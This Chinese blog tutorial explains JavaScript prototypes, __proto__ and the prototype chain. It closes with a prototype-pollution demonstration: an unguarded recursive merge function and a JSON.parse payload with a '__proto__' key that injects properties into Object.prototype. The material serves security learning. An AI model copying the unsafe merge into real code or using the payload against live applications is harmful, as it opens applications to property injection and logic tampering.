<h5 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a><strong>prototype</strong></h5><p>在javascript中关于prototype的解释是：每个js对象一定对应一个原型对象，并从原型对象继承属性和方法，但不是每个对象都有<code>__proto__</code>属性来标识自己所继承的原型，只有函数才有<code>prototype</code>属性。可能这样说不是很好理解，简单来说就是：我们都知道javascript是面向对象的，每个函数都有一个对象，每个对象都有一个prototype属性，这个属性是一个指针，指向我们的原型对象。并且这些对象都会有一个<strong>constructor</strong> 属性，这个属性指向所关联的构造函数。</p>
<p>下面我们通过两个例子来分析一下prototype属性:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;这里是测试&#x27;</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">var</span> person1 =<span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="property">name</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="property"><span class="keyword">prototype</span></span>)</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701204410150.png"
                      alt="image-20230701204410150"
                ></p>
<p>经过测试我们可以看到函数Person的原型是object{constructor:function Person()},但是我们实例化出来的非函数对象person1是没有原型的，这就验证了我们上面说的只有函数才有prototype属性。</p>
<p>prototype原型对象还有一个利用是我们可以使用它实现属性和方法的继承。</p>
<p>具体我们来通过一个示例代码来了解：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&#x27;test&#x27;</span> <span class="comment">//定义一个构造函数Person</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Teacher</span>(<span class="params"></span>) &#123; &#125; <span class="comment">//定义另一个构造函数</span></span><br><span class="line"><span class="title class_">Teacher</span>.<span class="property"><span class="keyword">prototype</span></span> = <span class="keyword">new</span> <span class="title class_">Person</span>() <span class="comment">//实现Teacher上面的原型继承Person上面的所有属性。</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="title class_">Teacher</span>();<span class="comment">//实例化一个Teache对象</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">name</span>);<span class="comment">//通过我们实例化的Teacher对象调用person函数的属性</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701205641379.png"
                      alt="image-20230701205641379"
                ></p>
<p>我们可以看到我们实例化的Teacher对象成功调用了Person函数的属性，这说明Teache的原型继承了Person函数的属性和方法。</p>
<p>除了这些我们还可以通过prototype来给对象添加属性或函数</p>
<p>example:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>) &#123; &#125; <span class="comment">//这里定义一个构造函数Person</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">name</span> = <span class="string">&quot;test&quot;</span>;<span class="comment">//通过原型添加一个name属性</span></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">say</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;<span class="comment">//通过原型添加一个say方法</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">name</span>);</span><br><span class="line">person.<span class="title function_">say</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701210526848.png"
                      alt="image-20230701210526848"
                ></p>
<p>通过运行结果我们可以看出我们的实例化对象可以正常访问我们添加的属性和方法。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701210903744.png"
                      alt="image-20230701210903744"
                ></p>
<h5 id="proto"><a href="#proto" class="headerlink" title="proto"></a><strong>proto</strong></h5><p>在上面我们讲了prototype,这里我们讲一下proto，proto属性也是javascript中的一个重要属性，但是proto和prototype不同的一点是proto存在与所有对象的属性里面，<strong>proto</strong>属性是在调用构造函数创建实例对象时产生的，这时因为当一个对象被创建时，这个构造函数将会把它的属性 prototype 赋给新对象的内部属性<code>__proto__</code>，于是这个<code>__proto__</code>被这个实例对象用来查找创建它的构造函数的prototype属性。</p>
<p>这里我通过例子来理解：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&quot;q111&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sayName</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Test</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Test</span>.<span class="property">__proto__</span>)</span><br><span class="line"><span class="title class_">Test</span>.<span class="property"><span class="keyword">prototype</span></span>=<span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="keyword">var</span> test=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(test.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Test</span>.<span class="property">__proto__</span>)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701212728495.png"
                      alt="image-20230701212728495"
                ></p>
<p>我们可以看到proto无论在那个对象里面都存在，并且我们实例化的对象经过proto会执行其构造函数的原型对象。所有我们总结可得proto是用来将对象与该对象的原型相连。</p>
<h4 id="2、proto和prototype的关系"><a href="#2、proto和prototype的关系" class="headerlink" title="2、proto和prototype的关系"></a>2、proto和prototype的关系</h4><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = <span class="string">&quot;q111&quot;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sayName</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person1=<span class="keyword">new</span> <span class="title class_">Person</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="property">__proto__</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701213443077.png"
                      alt="image-20230701213443077"
                ></p>
<p>可以看到我们的实例化对象的proto是等于构造函数的原型对象的，所有说proto是指向了构造函数的原型。</p>
<p>3.Function.prototype</p>
<p>每个 JavaScript 函数实际上都是一个 <code>Function</code> 对象。运行 <code>(function()&#123;&#125;).constructor === Function // true</code> 便可以得到这个结论。在我们代码中的构造函数、内置对象都是由 <strong>Function</strong> 创建的,通过 new 调用可以生成函数对象,比如自己创建的Person构造函数，以及<code>Number、String、Boolean、Object、Error、Array、RegExp、Date、Function</code>等内部对象。</p>
<p>那么这样的话这些函数的proto指向的就是function.prototype,所以说 <strong>Fucntion</strong> <code>这个函数的prototype</code> 是所有函数的 <strong>proto</strong> ，有 call, apply等方法。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property">__proto__</span> === <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>) </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">apply</span>.<span class="property">__proto__</span> === <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>) </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Number</span>.<span class="property">__proto__</span> === <span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>) </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701214500067.png"
                      alt="image-20230701214500067"
                ></p>
<p>用其他师傅博客的图更好的理解：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701214552500.png"
                      alt="image-20230701214552500"
                ></p>
<h4 id="3、Object-prototype-proto"><a href="#3、Object-prototype-proto" class="headerlink" title="3、Object.prototype.proto"></a>3、Object.prototype.proto</h4><p>每个实例对象（object）都有一个私有属性（称之为<code> __proto__</code> ）指向它的构造函数的原型对象<strong>prototype</strong>。该原型对象也有一个自己的原型对象（<code>__proto__</code>），层层向上直到一个对象的原型对象为 null。根据定义，null 没有原型，并作为这个原型链中的最后一个环节。当查到null就可以停止原型链的搜索。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701214925747.png"
                      alt="image-20230701214925747"
                ></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>([].<span class="property">__proto__</span>.<span class="property">__proto__</span>) </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Array</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701215104662.png"
                      alt="image-20230701215104662"
                ></p>
<p>同样的，我们上边创建的构造函数 <strong>Person</strong>，它的 <code>prototype</code> 属性就是有 <strong>Object</strong> 创建的，所以 <strong>Object</strong> 将自己的 <code>prototype</code> 属性,扔给了 <strong>Person</strong> 的原型的 <code>__proto__</code> 属性。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701215249942.png"
                      alt="image-20230701215249942"
                ></p>
<p>那么到这里我们可能会想function.prototype指向的是什么？</p>
<p>我们这里通过代码来探索：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>) <span class="comment">// true</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701215456715.png"
                      alt="image-20230701215456715"
                ></p>
<p>我们通过运行结果可以看到指向了obiect,那我们可以将<code>fuction()&#123;&#125;</code>看成对象 <strong>Object</strong> 的实例。那么这里就和上面一样了。</p>
<h4 id="4、什么是原型链"><a href="#4、什么是原型链" class="headerlink" title="4、什么是原型链"></a>4、什么是原型链</h4><p>这样层层向上的原型对象我们称为原型链，原型链的最上层是Object.prototype，并且它的原型是null，<code>null</code>表示原型链的终点，意味着它没有继续的原型对象，即没有原型链上的父级对象。这是为了确保原型链的结束，避免无限循环和属性查找的死循环。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701220419778.png"
                      alt="image-20230701220419778"
                ></p>
<p>这里我们通过一个图更好的理解：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701213931041.png"
                      alt="image-20230701213931041"
                ></p>
<p>当我们使用原型让一个函数的继承另一个函数的属性和方法，当我们访问实例对象的某个属性时会现在这个对象本身的属性上面寻找如果没有找到，则会通过__proto__ 属性去原型上面找，则会在构造函数的原型的<code>__proto__</code>中去找，这样一层层向上查找就会形成一个作用域链，称为原型链。</p>
<p>具体实现我们通过一个代码示例来理解：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span>=<span class="string">&#x27;test&#x27;</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">sex</span>=<span class="string">&#x27;男&#x27;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">b</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span>=<span class="string">&#x27;test1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">b.<span class="property"><span class="keyword">prototype</span></span>=<span class="keyword">new</span> <span class="title function_">a</span>();</span><br><span class="line"><span class="keyword">var</span> B=<span class="keyword">new</span> <span class="title function_">b</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(B.<span class="property">name</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(B.<span class="property">sex</span>)</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230701220724568.png"
                      alt="image-20230701220724568"
                ></p>
<h4 id="5、原型链污染"><a href="#5、原型链污染" class="headerlink" title="5、原型链污染"></a>5、原型链污染</h4><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">F</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> f=<span class="keyword">new</span> <span class="title function_">F</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(f.<span class="property">__proto__</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(F.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(f.<span class="property">__proto__</span> === F.<span class="property"><span class="keyword">prototype</span></span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230707140718684.png"
                      alt="image-20230707140718684"
                ></p>
<p>由上面例子我们可以得到实例化对象f.__proto__和F.prototype，是相等的，都是等于object</p>
<p>那么我们修改f.___proto__的值会不会改变F类</p>
<p>我们通过一个代码进行测试:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义一个基类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BaseClass</span> &#123;</span><br><span class="line">    <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个实例化对象</span></span><br><span class="line"><span class="keyword">const</span> obj = <span class="keyword">new</span> <span class="title class_">BaseClass</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用原型对象的方法</span></span><br><span class="line">obj.<span class="title function_">greet</span>(); <span class="comment">// Hello!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改原型对象的方法</span></span><br><span class="line"><span class="keyword">const</span> modifiedProto = &#123;</span><br><span class="line">    <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Oops, prototype pollution!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="property">__proto__</span> = modifiedProto;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原型链污染生效</span></span><br><span class="line">obj.<span class="title function_">greet</span>(); <span class="comment">// Oops, prototype pollution!</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230707142415723.png"
                      alt="image-20230707142415723"
                ></p>
<p>可以看到第一次执行greet方法和第二次执行的是不一样的，而且我们并不是直接去修改BaseClass中great的值，而是把obj.___proto__赋了一个新的greet函数内容</p>
<p>我们在这里把修改前后，obj的__proto__打印出来</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BaseClass</span> &#123;</span><br><span class="line">    <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = <span class="keyword">new</span> <span class="title class_">BaseClass</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">__proto__</span>)</span><br><span class="line"><span class="keyword">const</span> modifiedProto = &#123;</span><br><span class="line">    <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Oops, prototype pollution!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="property">__proto__</span> = modifiedProto;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(obj.<span class="property">__proto__</span>)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230707143201455.png"
                      alt="image-20230707143201455"
                ></p>
<p>我们通过直接修改 <code>obj</code> 对象的 <code>__proto__</code> 属性，将其设置为另一个对象 <code>modifiedProto</code>，该对象具有重新定义的 <code>greet</code> 方法。这导致了原型链污染，现在 <code>obj</code> 对象调用的 <code>greet</code> 方法变为了被修改后的版本，输出 “Oops, prototype pollution!”。</p>
<p>这里obj在调用greet()方法时回先在自身找属性或者方法，如果找不到就会沿着原型链向上查找，而现在原型链的第一个对象是</p>
<p>modifiedProto，而在这个对象里面就有greet()方法，然后就可以直接调用。</p>
<p>再看一个简单的例子：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xiaoming&quot;</span>&#125;</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">name</span>=<span class="string">&quot;xiaohong&quot;</span></span><br><span class="line"><span class="keyword">var</span> b=&#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b.<span class="property">name</span>)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230707164523200.png"
                      alt="image-20230707164523200"
                ></p>
<p>可以看到我们并没有在b中定义name属性</p>
<p>但是我们污染后可以访问b.name</p>
<p>具体我们通过下面代码看一下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;xiaoming&quot;</span>&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>)</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">name</span>=<span class="string">&quot;xiaohong&quot;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="property">__proto__</span>)</span><br><span class="line"><span class="keyword">var</span> b=&#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b.<span class="property">name</span>)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230707165420320.png"
                      alt="image-20230707165420320"
                ></p>
<p>可以看到我们a.<strong>proto</strong>.name&#x3D;”xiaohong”赋值后在object中多了name的属性值，这是因为a.__proto__就是object，那我这行代码就是object中插入了一个name属性</p>
<p>那么我们b.name在自身对象找不到属性时，就会沿着原型链向上查找，到object找到了name属性，然后就会输出。</p>
<h4 id="6、原型链污染的利用（此部分只是以一个复现）"><a href="#6、原型链污染的利用（此部分只是以一个复现）" class="headerlink" title="6、原型链污染的利用（此部分只是以一个复现）"></a>6、原型链污染的利用（此部分只是以一个复现）</h4><h5 id="对象merge"><a href="#对象merge" class="headerlink" title="对象merge"></a>对象merge</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们可以看到在合并的过程中的存在一个</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">target[key] = source[key]</span><br></pre></td></tr></table></figure></div>

<p>这里是一个赋值操作</p>
<p>那么如果我们这里的这个key是一个__proto__,那我们就可以进行原型链污染</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = &#123; a: 1, &quot;__proto__&quot;: &#123; b: 2 &#125; &#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230707171113748.png"
                      alt="image-20230707171113748"
                ></p>
<p>但是根据运行结果我们可以看到并没有污染成功</p>
<p>这是因为我们是通过</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">let o2 = &#123; a: 1, &quot;__proto__&quot;: &#123; b: 2 &#125; &#125;</span><br></pre></td></tr></table></figure></div>

<p>这里打一个输出：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230707174238227.png"
                      alt="image-20230707174238227"
                ></p>
<p>可以看到这里输出的键值是[a,b],而不是__proto__,这是我们在遍历键值时__proto__代表o2的原型，而不是一个可以key</p>
<p>那么就无法成功修改object的原型</p>
<p>修改一下代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function merge(target, source) &#123;</span><br><span class="line">    console.log(source)</span><br><span class="line">    console.log(target)</span><br><span class="line">    for (let key in source) &#123;</span><br><span class="line">      </span><br><span class="line">        if (key in source &amp;&amp; key in target) &#123;</span><br><span class="line">            console.log(key)</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            console.log(key)</span><br><span class="line">            </span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let o1 = &#123;&#125;</span><br><span class="line">let o2 = JSON.parse(&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;)</span><br><span class="line">merge(o1, o2)</span><br><span class="line">console.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230707174625210.png"
                      alt="image-20230707174625210"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230707175128102.png"
                      alt="image-20230707175128102"
                ></p>
<p>重点在这</p>
<p>如果键值在这两个里面都存在就会进入这个if判断</p>
<p>我这里打了输出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230707175530444.png"
                      alt="image-20230707175530444"
                ></p>
<p>那么再去执行就变成了merge([Object: null prototype] {},{b,2})</p>
<p>那么再次执行merge函数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">target[b] = source[b]=2</span><br></pre></td></tr></table></figure></div>

<p>上面我们可以看到target&#x3D;[Object: null prototype] {}</p>
<p>那么就等于再object中插入了一个属性b值为2</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line">console.log(o3.b)</span><br></pre></td></tr></table></figure></div>

<p>那我们这里o3在自身找不到属性b的值就会沿着原型链查找，到object会找到b属性的值输出</p>
